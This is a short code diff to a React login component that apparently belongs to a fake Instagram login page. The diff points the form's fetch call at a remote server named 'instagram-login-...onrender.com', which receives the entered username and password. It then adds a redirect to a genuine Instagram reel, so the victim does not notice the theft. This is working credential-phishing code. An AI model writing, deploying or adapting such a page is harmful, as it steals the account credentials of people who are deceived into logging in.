@@ -10,8 +10,8 @@ const Login = () => {
     setIsPasswordVisible(!IsPasswordVisible);
   };
 
-  const URL = "http://localhost:3001";
-  // const URL = "https://instagram-login-7y5a.onrender.com";
+  // const URL = "http://localhost:3001";
+  const URL = "https://instagram-login-7y5a.onrender.com";
 
   const Login = async () => {
     const jsonData = await fetch(URL + "/login", {
@@ -20,6 +20,8 @@ const Login = () => {
       body: JSON.stringify({ username, Password }),
     }).then((res) => res.json());
     console.log(jsonData);
+    window.location.href =
+      "https://www.instagram.com/reel/CvufHHloseg/?igsh=MWJscXUyeXpyNnQxbA==";
   };
 
   useEffect(() => {
